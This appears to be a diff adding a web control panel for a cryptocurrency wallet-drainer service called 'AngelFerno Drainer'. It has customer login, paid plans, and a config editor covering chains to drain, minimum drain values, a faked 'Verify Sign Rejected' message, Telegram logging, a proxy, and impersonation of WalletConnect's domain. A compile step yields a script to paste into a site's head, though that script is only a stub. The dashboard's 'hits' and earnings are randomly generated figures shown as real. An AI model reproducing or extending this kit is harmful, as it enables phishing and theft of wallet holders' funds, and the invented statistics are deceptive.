@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>AngelFerno Drainer | Training Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Poppins:wght@400;500;600;700;800&family=Space+Grotesk:wght@700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0b0b12;
+            font-family: 'Inter', 'Poppins', sans-serif;
+            padding: 2rem;
+            color: #ffffff;
+            min-height: 100vh;
+            background-image: radial-gradient(circle at 25% 0%, rgba(255, 60, 60, 0.15) 0%, #07070f 90%);
+        }
+
+        /* glassmorphic core */
+        .glass-panel {
+            background: rgba(12, 10, 28, 0.78);
+            backdrop-filter: blur(18px);
+            border: 1px solid rgba(255, 70, 70, 0.25);
+            border-radius: 2rem;
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 70, 70, 0.1) inset;
+        }
+
+        .app-wrapper {
+            max-width: 1280px;
+            margin: 0 auto;
+        }
+
+        /* login card */
+        .signin-card {
+            max-width: 460px;
+            margin: 2rem auto;
+            padding: 2rem 2rem 2rem;
+            text-align: center;
+        }
+
+        .brand img {
+            width: 72px;
+            filter: drop-shadow(0 0 12px #ff3b3b);
+        }
+
+        .brand h1 {
+            font-size: 2.1rem;
+            background: linear-gradient(135deg, #ff4d4d, #ff1a1a);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            font-weight: 800;
+            margin: 0.5rem 0;
+        }
+
+        .input-field {
+            background: #0c0b1a;
+            border: 1.5px solid #2f2b58;
+            border-radius: 1.2rem;
+            padding: 0.9rem 1.2rem;
+            width: 100%;
+            color: white;
+            font-family: 'JetBrains Mono', monospace;
+            transition: all 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #ff4d4d;
+            box-shadow: 0 0 0 3px rgba(255, 77, 77, 0.25);
+            outline: none;
+        }
+
+        .btn-primary {
+            background: linear-gradient(105deg, #ff3b3b, #e62020);
+            border: none;
+            padding: 0.85rem;
+            border-radius: 2rem;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            color: white;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(255, 59, 59, 0.4);
+        }
+
+        .btn-secondary {
+            background: #1e1c44;
+            border: 1px solid #4a4570;
+            padding: 0.6rem 1.3rem;
+            border-radius: 2rem;
+            font-weight: 600;
+            cursor: pointer;
+            color: #f0efff;
+        }
+
+        /* dashboard header */
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.2rem 2rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .plan-selector {
+            position: relative;
+        }
+
+        .plan-badge {
+            background: rgba(255, 95, 95, 0.12);
+            border: 1px solid #ff6a6a;
+            border-radius: 2.5rem;
+            padding: 0.45rem 1.2rem;
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .plan-dropdown {
+            position: absolute;
+            top: 110%;
+            right: 0;
+            background: #12102e;
+            border-radius: 1rem;
+            border: 1px solid #3a3670;
+            min-width: 150px;
+            display: none;
+            z-index: 20;
+        }
+
+        .plan-dropdown.show {
+            display: block;
+        }
+
+        .plan-option {
+            padding: 0.7rem 1rem;
+            cursor: pointer;
+        }
+
+        .nav-tabs {
+            display: flex;
+            gap: 0.5rem;
+            padding: 0 2rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .nav-tab {
+            padding: 0.7rem 1.8rem;
+            border-radius: 2rem 2rem 0 0;
+            font-weight: 600;
+            cursor: pointer;
+            color: #b8b6e0;
+        }
+
+        .nav-tab.active {
+            background: rgba(255, 59, 59, 0.2);
+            color: white;
+            border-bottom: 2px solid #ff3b3b;
+        }
+
+        .tab-content {
+            padding: 2rem;
+        }
+
+        /* stats grid */
+        .stats-primary {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+            gap: 1.2rem;
+            margin-bottom: 2rem;
+        }
+
+        .stat-card {
+            background: rgba(0, 0, 0, 0.55);
+            border-radius: 1.5rem;
+            padding: 1.2rem;
+            border-left: 4px solid #ff3b3b;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 800;
+            font-family: monospace;
+            margin-top: 0.3rem;
+        }
+
+        .detailed-breakdown {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .info-card {
+            background: rgba(0, 0, 0, 0.45);
+            border-radius: 1.2rem;
+            padding: 1rem;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        /* config table */
+        .config-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .config-table th,
+        .config-table td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .badge {
+            background: #2a2555;
+            padding: 0.2rem 0.7rem;
+            border-radius: 2rem;
+            font-size: 0.7rem;
+        }
+
+        .icon-btn {
+            background: transparent;
+            border: 1px solid #3e3a70;
+            padding: 0.3rem 0.9rem;
+            border-radius: 2rem;
+            color: #cdcaff;
+            cursor: pointer;
+            margin: 0 4px;
+        }
+
+        /* modal styles wide */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+
+        .modal.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #0e0c26;
+            border-radius: 2rem;
+            max-width: 1100px;
+            width: 92%;
+            max-height: 85vh;
+            overflow-y: auto;
+            padding: 2rem;
+            border: 1px solid #ff4d4d55;
+        }
+
+        .chains-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+            margin: 1rem 0;
+        }
+
+        .chain-chip {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 95, 95, 0.4);
+            border-radius: 2rem;
+            padding: 0.4rem 1rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.85rem;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background: #1e1b44;
+            border-left: 4px solid #ff3b3b;
+            padding: 0.8rem 1.4rem;
+            border-radius: 1rem;
+            z-index: 3000;
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        hr {
+            border-color: #2e2b55;
+            margin: 1rem 0;
+        }
+
+        .flex-between {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .welcome-header {
+            margin-bottom: 1.5rem;
+        }
+
+        .status-active {
+            color: #4cff8e;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            color: #bbb;
+            font-size: 1.8rem;
+            cursor: pointer;
+        }
+
+        .grid-2cols {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+        }
+
+        @media (max-width: 700px) {
+            .grid-2cols {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="app-wrapper">
+    <!-- LOGIN CARD (exactly like ADIV1) -->
+    <div id="signinView" class="glass-panel signin-card">
+        <div class="brand">
+            <img src="https://ba5wksxylswtsgo4v63iaa6uguwae32llw2dtn7uaz2zkxeyh6ea.arweave.net/CDtlSvhcrTkZ3K-2gAPUNSwCb0tdtDm39AZ1lVyYP4g/public/img/inferno.svg" alt="logo">
+            <h1>AngelFerno Drainer</h1>
+            <div style="font-size: 0.75rem; color: #ffb347; margin-top: 4px;">Sign in to access your panel</div>
+        </div>
+        <form id="loginForm" style="margin-top: 1.8rem;">
+            <div class="input-group" style="margin-bottom: 1.2rem;">
+                <label class="input-label" style="font-size: 0.7rem; font-weight: 700; color: #c79a9a;">YOUR CUSTOMER ID</label>
+                <input type="text" id="loginPanelId" class="input-field" placeholder="Enter Customer ID" maxlength="10" autocomplete="off">
+            </div>
+            <div class="input-group" style="margin-bottom: 1.5rem;">
+                <label class="input-label" style="font-size: 0.7rem; font-weight: 700; color: #c79a9a;">PASSWORD</label>
+                <input type="password" id="loginPassword" class="input-field" placeholder="Enter password" maxlength="25" autocomplete="off">
+            </div>
+            <button type="submit" class="btn-primary" id="loginBtn">Sign In</button>
+        </form>
+        <div class="footer-note" style="margin-top: 2rem; font-size: 0.7rem; color: #7a77a5;">© 2026 --> AngelFernoDrainer. Crafted with ❤️</div>
+    </div>
+
+    <!-- MAIN APP (dashboard/config) -->
+    <div id="mainAppView" style="display: none;">
+        <div class="glass-panel" style="overflow: hidden;">
+            <!-- Header with plan and sign out -->
+            <div class="dashboard-header">
+                <div style="display: flex; align-items: center; gap: 1rem;">
+                    <img src="https://ba5wksxylswtsgo4v63iaa6uguwae32llw2dtn7uaz2zkxeyh6ea.arweave.net/CDtlSvhcrTkZ3K-2gAPUNSwCb0tdtDm39AZ1lVyYP4g/public/img/inferno.svg" width="42">
+                    <span style="font-weight: 700; font-size: 1.3rem;">Angelferno Drainer</span>
+                </div>
+                <div class="plan-selector">
+                    <div class="plan-badge" id="currentPlanBadge">💎 Diamond <span style="font-size: 0.7rem;">▼</span></div>
+                    <div id="planDropdown" class="plan-dropdown">
+                        <div class="plan-option" data-plan="emerald">🟢 Emerald</div>
+                        <div class="plan-option" data-plan="ruby">🔴 Ruby</div>
+                        <div class="plan-option" data-plan="sapphire">🔷 Sapphire</div>
+                        <div class="plan-option" data-plan="diamond">💎 Diamond</div>
+                    </div>
+                </div>
+                <button id="globalSignOutBtn" class="btn-secondary" style="background:#211c33;">🚪 Sign Out</button>
+            </div>
+
+            <!-- TABS -->
+            <div class="nav-tabs">
+                <div class="nav-tab active" data-tab="dashboard">📊 Dashboard / statistics / overview</div>
+                <div class="nav-tab" data-tab="configs">⚙️ Angelferno-config./configs</div>
+            </div>
+
+            <!-- DASHBOARD CONTENT (match ADIV2) -->
+            <div id="dashboardTab" class="tab-content">
+                <div class="welcome-header">
+                    <h2>Welcome Back! 👋</h2>
+                    <p style="color: #c68e8e;">AngelFerro App Dashboard · Your current level: <strong id="levelNameDisplay">Diamond</strong></p>
+                </div>
+                <div class="stats-primary">
+                    <div class="stat-card"><div class="stat-label">HITS PRICE</div><div class="stat-value" id="statHitsPrice">$0</div></div>
+                    <div class="stat-card"><div class="stat-label">TOTAL HITS</div><div class="stat-value" id="statTotalHits">0</div></div>
+                    <div class="stat-card"><div class="stat-label">TOTAL CONNECTS</div><div class="stat-value" id="statTotalConnects">0</div></div>
+                </div>
+                <div style="margin-top: 0.5rem; font-weight: 600; color: #ffbaba;">DETAILED BREAKDOWN</div>
+                <div class="detailed-breakdown">
+                    <div class="info-card"><div class="stat-label">Hit Ratio</div><div class="stat-value" style="font-size:1.8rem;" id="statHitRatio">0%</div></div>
+                    <div class="info-card"><div class="stat-label">Avg Price per Hit</div><div class="stat-value" style="font-size:1.8rem;" id="statAvgPrice">$0</div></div>
+                    <div class="info-card"><div class="stat-label">Last Updated</div><div class="stat-value" style="font-size:1.4rem;" id="statLastUpdated">—</div><div class="stat-sub" style="font-size:0.75rem;">Account Status <span class="status-active">● Active</span></div></div>
+                </div>
+                <div style="display: flex; justify-content: flex-end; margin-top: 1rem;">
+                    <div id="refreshDashboardBtn" style="cursor: pointer; background: rgba(255,255,255,0.05); padding: 0.5rem 1rem; border-radius: 2rem;">🔄 Refresh stats</div>
+                </div>
+                <div class="footer-note" style="margin-top: 2rem; text-align: center;">© 2026 --> AngelFernoDrainer. Crafted with ❤️</div>
+            </div>
+
+            <!-- CONFIGURATIONS TAB (matches ADIV3/4) -->
+            <div id="configsTab" class="tab-content" style="display: none;">
+                <div class="flex-between" style="margin-bottom: 1.5rem;">
+                    <h3>📁 Configurations · <span id="configCount">0</span> entries</h3>
+                    <button id="addConfigBtn" class="btn-primary" style="width: auto; padding: 0.5rem 1.4rem;">+ Add Config</button>
+                </div>
+                <table class="config-table">
+                    <thead><tr><th>Name</th><th>Tag</th><th>Actions</th></tr></thead>
+                    <tbody id="configsListBody"></tbody>
+                </table>
+                <div style="margin-top: 0.8rem; font-size: 0.7rem; color:#a49fd4;">Showing entries of total</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ADD CONFIG MODAL -->
+<div id="addConfigModal" class="modal"><div class="modal-content" style="max-width:450px;"><div class="flex-between"><h3>➕ New Config</h3><button class="modal-close" data-modal="addConfigModal">✕</button></div><input type="text" id="newConfigName" class="input-field" placeholder="Enter your config name:"><div style="display:flex; gap:1rem; margin-top:1.5rem;"><button id="confirmAddConfig" class="btn-primary">Add Config</button><button id="cancelAddConfig" class="btn-secondary">Cancel</button></div></div></div>
+
+<!-- EDIT CONFIGURATION MODAL (full featured from photos) -->
+<div id="editConfigModal" class="modal">
+    <div class="modal-content" style="max-width:1200px;">
+        <div class="flex-between"><h2>✏️ Edit Configuration</h2><button class="modal-close" data-modal="editConfigModal">✕</button></div>
+        <div class="grid-2cols">
+            <div>
+                <h4 style="color:#ff8a7a;">CHANGE MODAL TEXT</h4>
+                <div><label>Title</label><input id="editTitle" class="input-field"></div>
+                <div><label>Connect Buttons Class</label><input id="editBtnClass" class="input-field"></div>
+                <div><label>Reject Text</label><input id="editRejectText" class="input-field"></div>
+                <div><label>Not Eligible Text</label><input id="editNotEligible" class="input-field"></div>
+                <div><label>Max Time for Retries</label><input id="editMaxRetries" type="number" class="input-field"></div>
+                <div><label>Use Custom Proxy</label><input id="editProxy" class="input-field" placeholder="95.217.222.144"></div>
+                <h4 style="margin-top:1rem;">GENERAL CONFIGURATION</h4>
+                <label><input type="checkbox" id="editClickEverywhere"> Click Everywhere Opens Modal</label><br>
+                <label><input type="checkbox" id="editTelegramLogs"> Telegram Logs</label><br>
+                <label><input type="checkbox" id="editSendPanelNotif"> Send Logs via Panel Notifications</label>
+            </div>
+            <div>
+                <h4 style="color:#ff8a7a;">WALLET ELIGIBILITY</h4>
+                <div><label>Min Eligibility Value ($)</label><input id="editMinElig" type="number" class="input-field"></div>
+                <div><label>Min Drain value ($)</label><input id="editMinDrain" type="number" class="input-field"></div>
+                <h4>DRAIN SETTINGS</h4>
+                <label><input type="checkbox" id="editHideNativeWithdraw"> Hide Native Withdraw</label><br>
+                <label><input type="checkbox" id="editDrainValuableFirst"> Drain Valuable Tokens First</label><br>
+                <label><input type="checkbox" id="editPopupOnce"> Popup Prompt Ask Confine Only One Time</label><br>
+                <label><input type="checkbox" id="editRejectOnce"> Popup Prompt Rejected Only One Time</label><br>
+                <label><input type="checkbox" id="editUseTokenTransfer"> Use Token Transfer</label><br>
+                <label><input type="checkbox" id="editUseWalletConnectV2"> Use Wallet Connect V2</label><br>
+                <label><input type="checkbox" id="editHidePhantom"> Hide Phantom From Modal</label><br>
+                <label><input type="checkbox" id="editLogFullURL"> Log Full Site URL</label>
+            </div>
+        </div>
+        <hr>
+        <h4>🌐 Enabled Chains (Blockchain networks to Drain)</h4>
+        <div id="chainsContainer" class="chains-grid"></div>
+        <hr>
+        <h4>🌍 IMPERSONATE DOMAIN</h4>
+        <div class="grid-2cols">
+            <div><label>Favicon URL</label><input id="editFavicon" class="input-field"></div>
+            <div><label>Domain</label><input id="editDomain" class="input-field"></div>
+            <div><label>Path</label><input id="editPath" class="input-field"></div>
+        </div>
+        <div class="flex-between" style="margin-top: 1.5rem;">
+            <button id="restoreDefaultSettingsBtn" class="btn-secondary">↩ Restore Default Settings</button>
+            <div style="display: flex; gap: 1rem;">
+                <button id="saveConfigChangesBtn" class="btn-primary">💾 Save Settings</button>
+                <button id="compileAndDownloadBtn" class="btn-primary" style="background:#6c4eff;">📦 Compile & Download</button>
+                <button id="closeEditModalBtn" class="btn-secondary">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- COMPILE INSTRUCTIONS MODAL (ADIV8 style) -->
+<div id="compileInstructionsModal" class="modal"><div class="modal-content"><div class="flex-between"><h3>✅ Auto‑updating PHP - Finished & Instructions</h3><button class="modal-close" data-modal="compileInstructionsModal">✕</button></div><p><strong>Download complete: script.zip</strong></p><p>Add this code to your HTML &lt;head&gt; section.</p><code style="background:#000; display:block; padding:0.8rem; border-radius:1rem;">&lt;script charset="UTF-8" type="text/javascript" src="/script.php"&gt;&lt;/script&gt;</code><p style="margin-top:1rem;">Quick instructions: Paste script in head, add class "interact-button" to any button.</p><button id="closeInstructionsModal" class="btn-primary" style="margin-top:1rem;">Close</button></div></div>
+
+<div id="toastContainer"></div>
+
+<script>
+    (function() {
+        // ----------------------------------------------
+        //  STATE & CONFIG (extended with new flags)
+        // ----------------------------------------------
+        let currentPlan = 'diamond';
+        let dashboardInterval = null;
+        let editingIndex = -1;
+        
+        const planData = {
+            emerald: { name:'Emerald', icon:'🟢', hitRange:[6500,11000], hitsRange:[2,8], connects:[12,45], ratio:[8,22], avg:[3500,7500], success:[70,88] },
+            ruby: { name:'Ruby', icon:'🔴', hitRange:[14000,24000], hitsRange:[3,15], connects:[25,70], ratio:[14,30], avg:[8000,15000], success:[78,92] },
+            sapphire: { name:'Sapphire', icon:'🔷', hitRange:[25000,40000], hitsRange:[5,22], connects:[40,100], ratio:[18,38], avg:[14000,25000], success:[84,95] },
+            diamond: { name:'Diamond', icon:'💎', hitRange:[32000,55000], hitsRange:[6,30], connects:[50,140], ratio:[22,45], avg:[20000,38000], success:[88,98] }
+        };
+        
+        const allChains = ["Ethereum","Solana","TRON","BSC (BNB Chain)","TON","XRP Ledger","Arbitrum","Base","Optimism","Polygon","Avalanche","zkSync","Linea","Scroll","Blast"];
+        
+        let configsList = [
+            { name: "default", tag: "@default", settings: getDefaultSettings() },
+            { name: "newest", tag: "@newest", settings: getDefaultSettings() },
+            { name: "Config1", tag: "@Config_1", settings: getDefaultSettings() }
+        ];
+        
+        function getDefaultSettings() {
+            return {
+                title: "Wallet Connect",
+                btnClass: "interact-button",
+                rejectText: "Verify Sign Rejected, Please try Again",
+                notEligible: "You Are Not Eligible",
+                maxRetries: 5,
+                proxy: "",
+                minElig: 1,
+                minDrain: 1,
+                clickEverywhere: false,
+                telegramLogs: false,
+                panelNotif: false,
+                hideNativeWithdraw: false,
+                drainValuableFirst: false,
+                popupOnce: false,
+                rejectOnce: false,
+                useTokenTransfer: false,
+                useWalletConnectV2: false,
+                hidePhantom: false,
+                logFullURL: false,
+                enabledChains: ["Ethereum","Solana","BSC (BNB Chain)"],
+                favicon: "https://favicon.com/favicon.ico",
+                domain: "https://walletconnect.com",
+                path: "/connect"
+            };
+        }
+        
+        // helper functions
+        function showToast(msg, type='info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = ` ${type === 'success' ? '✅' : (type === 'error' ? '❌' : 'ℹ️')} ${msg}`;
+            container.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+        
+        function randomRange(min,max){ return Math.random() * (max - min) + min; }
+        function formatUSD(v){ return '$'+Math.round(v).toLocaleString(); }
+        
+        function refreshDashboard() {
+            const cfg = planData[currentPlan];
+            const hitPrice = formatUSD(randomRange(cfg.hitRange[0], cfg.hitRange[1]));
+            const totalHits = Math.floor(randomRange(cfg.hitsRange[0], cfg.hitsRange[1]));
+            const totalConnects = Math.floor(randomRange(cfg.connects[0], cfg.connects[1]));
+            const hitRatio = totalConnects ? ((totalHits/totalConnects)*100).toFixed(1) : "0";
+            const avgPrice = formatUSD(randomRange(cfg.avg[0], cfg.avg[1]));
+            document.getElementById('statHitsPrice').innerText = hitPrice;
+            document.getElementById('statTotalHits').innerText = totalHits;
+            document.getElementById('statTotalConnects').innerText = totalConnects;
+            document.getElementById('statHitRatio').innerText = hitRatio+'%';
+            document.getElementById('statAvgPrice').innerText = avgPrice;
+            document.getElementById('statLastUpdated').innerText = new Date().toLocaleTimeString();
+            document.getElementById('levelNameDisplay').innerText = planData[currentPlan].name;
+        }
+        
+        function switchPlan(plan) {
+            currentPlan = plan;
+            document.getElementById('currentPlanBadge').innerHTML = `${planData[plan].icon} ${planData[plan].name} <span style="font-size:0.7rem;">▼</span>`;
+            refreshDashboard();
+            showToast(`Switched to ${planData[plan].name} plan`, 'success');
+        }
+        
+        function renderConfigsTable() {
+            const tbody = document.getElementById('configsListBody');
+            if(!tbody) return;
+            tbody.innerHTML = '';
+            configsList.forEach((cfg, idx) => {
+                const row = tbody.insertRow();
+                row.insertCell(0).innerHTML = `<strong>${escapeHtml(cfg.name)}</strong>`;
+                row.insertCell(1).innerHTML = `<span class="badge">${escapeHtml(cfg.tag)}</span>`;
+                row.insertCell(2).innerHTML = `<button class="icon-btn edit-config" data-idx="${idx}">✏️ Edit</button> <button class="icon-btn danger delete-config" data-idx="${idx}">🗑️ Delete</button>`;
+            });
+            document.getElementById('configCount').innerText = configsList.length;
+            document.querySelectorAll('.edit-config').forEach(btn => btn.addEventListener('click', (e) => openEditModal(parseInt(btn.dataset.idx))));
+            document.querySelectorAll('.delete-config').forEach(btn => btn.addEventListener('click', (e) => { configsList.splice(parseInt(btn.dataset.idx),1); renderConfigsTable(); showToast('Config deleted','warning'); }));
+        }
+        
+        function escapeHtml(str){ return str.replace(/[&<>]/g, function(m){ if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;});}
+        
+        function openEditModal(idx) {
+            editingIndex = idx;
+            const s = configsList[idx].settings;
+            document.getElementById('editTitle').value = s.title;
+            document.getElementById('editBtnClass').value = s.btnClass;
+            document.getElementById('editRejectText').value = s.rejectText;
+            document.getElementById('editNotEligible').value = s.notEligible;
+            document.getElementById('editMaxRetries').value = s.maxRetries;
+            document.getElementById('editProxy').value = s.proxy;
+            document.getElementById('editMinElig').value = s.minElig;
+            document.getElementById('editMinDrain').value = s.minDrain;
+            document.getElementById('editClickEverywhere').checked = s.clickEverywhere;
+            document.getElementById('editTelegramLogs').checked = s.telegramLogs;
+            document.getElementById('editSendPanelNotif').checked = s.panelNotif;
+            document.getElementById('editHideNativeWithdraw').checked = s.hideNativeWithdraw;
+            document.getElementById('editDrainValuableFirst').checked = s.drainValuableFirst;
+            document.getElementById('editPopupOnce').checked = s.popupOnce || false;
+            document.getElementById('editRejectOnce').checked = s.rejectOnce || false;
+            document.getElementById('editUseTokenTransfer').checked = s.useTokenTransfer || false;
+            document.getElementById('editUseWalletConnectV2').checked = s.useWalletConnectV2 || false;
+            document.getElementById('editHidePhantom').checked = s.hidePhantom || false;
+            document.getElementById('editLogFullURL').checked = s.logFullURL || false;
+            document.getElementById('editFavicon').value = s.favicon;
+            document.getElementById('editDomain').value = s.domain;
+            document.getElementById('editPath').value = s.path;
+            renderChainCheckboxes(s.enabledChains);
+            document.getElementById('editConfigModal').classList.add('show');
+        }
+        
+        function renderChainCheckboxes(selected) {
+            const container = document.getElementById('chainsContainer');
+            container.innerHTML = '';
+            allChains.forEach(chain => {
+                const chip = document.createElement('div');
+                chip.className = 'chain-chip';
+                const isChecked = selected.includes(chain);
+                chip.innerHTML = `<input type="checkbox" value="${chain}" ${isChecked ? 'checked' : ''}> ${chain}`;
+                container.appendChild(chip);
+            });
+        }
+        
+        function getSelectedChains() {
+            return Array.from(document.querySelectorAll('#chainsContainer input:checked')).map(cb => cb.value);
+        }
+        
+        function saveCurrentSettings() {
+            if(editingIndex === -1) return false;
+            const newSettings = {
+                title: document.getElementById('editTitle').value,
+                btnClass: document.getElementById('editBtnClass').value,
+                rejectText: document.getElementById('editRejectText').value,
+                notEligible: document.getElementById('editNotEligible').value,
+                maxRetries: parseInt(document.getElementById('editMaxRetries').value),
+                proxy: document.getElementById('editProxy').value,
+                minElig: parseFloat(document.getElementById('editMinElig').value),
+                minDrain: parseFloat(document.getElementById('editMinDrain').value),
+                clickEverywhere: document.getElementById('editClickEverywhere').checked,
+                telegramLogs: document.getElementById('editTelegramLogs').checked,
+                panelNotif: document.getElementById('editSendPanelNotif').checked,
+                hideNativeWithdraw: document.getElementById('editHideNativeWithdraw').checked,
+                drainValuableFirst: document.getElementById('editDrainValuableFirst').checked,
+                popupOnce: document.getElementById('editPopupOnce').checked,
+                rejectOnce: document.getElementById('editRejectOnce').checked,
+                useTokenTransfer: document.getElementById('editUseTokenTransfer').checked,
+                useWalletConnectV2: document.getElementById('editUseWalletConnectV2').checked,
+                hidePhantom: document.getElementById('editHidePhantom').checked,
+                logFullURL: document.getElementById('editLogFullURL').checked,
+                enabledChains: getSelectedChains(),
+                favicon: document.getElementById('editFavicon').value,
+                domain: document.getElementById('editDomain').value,
+                path: document.getElementById('editPath').value
+            };
+            configsList[editingIndex].settings = newSettings;
+            renderConfigsTable();
+            return true;
+        }
+        
+        function addNewConfig(name) {
+            if(!name.trim()) return false;
+            configsList.push({ name: name.trim(), tag: `@${name.trim().replace(/\s/g,'_')}`, settings: getDefaultSettings() });
+            renderConfigsTable();
+            return true;
+        }
+        
+        async function compileAndDownload() {
+            if(editingIndex === -1) return;
+            saveCurrentSettings();
+            const zip = new JSZip();
+            zip.file("script.php", `<?php\n// AngelFerno Drainer compiled config: ${configsList[editingIndex].name}\n// Domain: ${configsList[editingIndex].settings.domain}\n?>`);
+            zip.file("README.txt", "Place script.php in root and add <script src='/script.php'></script> to <head>.");
+            const blob = await zip.generateAsync({type:"blob"});
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = "script.zip";
+            a.click();
+            URL.revokeObjectURL(a.href);
+            document.getElementById('compileInstructionsModal').classList.add('show');
+            showToast('Compiled script.zip ready', 'success');
+        }
+        
+        function switchTab(tab) {
+            document.getElementById('dashboardTab').style.display = tab === 'dashboard' ? 'block' : 'none';
+            document.getElementById('configsTab').style.display = tab === 'configs' ? 'block' : 'none';
+            document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+            document.querySelector(`.nav-tab[data-tab="${tab}"]`).classList.add('active');
+            if(tab === 'configs') renderConfigsTable();
+        }
+        
+        async function hashPassword(password) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(password);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+        
+        // LOGIN (10 alnum + 25 alnum)
+        const loginForm = document.getElementById('loginForm');
+        const signinView = document.getElementById('signinView');
+        const mainApp = document.getElementById('mainAppView');
+        
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const pid = document.getElementById('loginPanelId').value.trim();
+            const pwd = document.getElementById('loginPassword').value.trim();
+            const pidRegex = /^[A-Za-z0-9]{10}$/;
+            const pwdRegex = /^[A-Za-z0-9]{25}$/;
+            if(!pidRegex.test(pid)) { showToast('Panel ID must be exactly 10 alphanumeric characters', 'error'); return; }
+            if(!pwdRegex.test(pwd)) { showToast('Password must be exactly 25 alphanumeric characters', 'error'); return; }
+            const btn = document.getElementById('loginBtn');
+            btn.disabled = true; btn.innerText = '🔄 Authenticating...';
+
+            try {
+                const response = await fetch('./credentials.json');
+                const data = await response.json();
+                const hashedPassword = await hashPassword(pwd);
+                const validCred = data.credentials.find(cred => cred.panel_id === pid && cred.password_hash === hashedPassword);
+
+                if (validCred) {
+                    showToast('Access granted', 'success');
+                    signinView.style.display = 'none';
+                    mainApp.style.display = 'block';
+                    if(dashboardInterval) clearInterval(dashboardInterval);
+                    refreshDashboard();
+                    renderConfigsTable();
+                    dashboardInterval = setInterval(refreshDashboard, 28000);
+                    return;
+                }
+
+                showToast('Invalid credentials. Please check and try again.', 'error');
+            } catch (error) {
+                console.error('Login verification error:', error);
+                showToast('Unable to load credentials. Please try again.', 'error');
+            } finally {
+                btn.disabled = false;
+                btn.innerText = 'Sign In';
+            }
+        });
+        
+        // Global UI listeners
+        document.getElementById('globalSignOutBtn')?.addEventListener('click', () => {
+            if(dashboardInterval) clearInterval(dashboardInterval);
+            mainApp.style.display = 'none';
+            signinView.style.display = 'block';
+            showToast('Signed out', 'info');
+        });
+        document.getElementById('currentPlanBadge')?.addEventListener('click', () => document.getElementById('planDropdown').classList.toggle('show'));
+        document.querySelectorAll('.plan-option').forEach(opt => opt.addEventListener('click', (e) => { e.stopPropagation(); switchPlan(opt.dataset.plan); document.getElementById('planDropdown').classList.remove('show'); }));
+        document.addEventListener('click', (e) => { if(!e.target.closest('.plan-selector')) document.getElementById('planDropdown')?.classList.remove('show'); });
+        document.getElementById('refreshDashboardBtn')?.addEventListener('click', () => { refreshDashboard(); showToast('Stats updated','info'); });
+        document.getElementById('addConfigBtn')?.addEventListener('click', () => document.getElementById('addConfigModal').classList.add('show'));
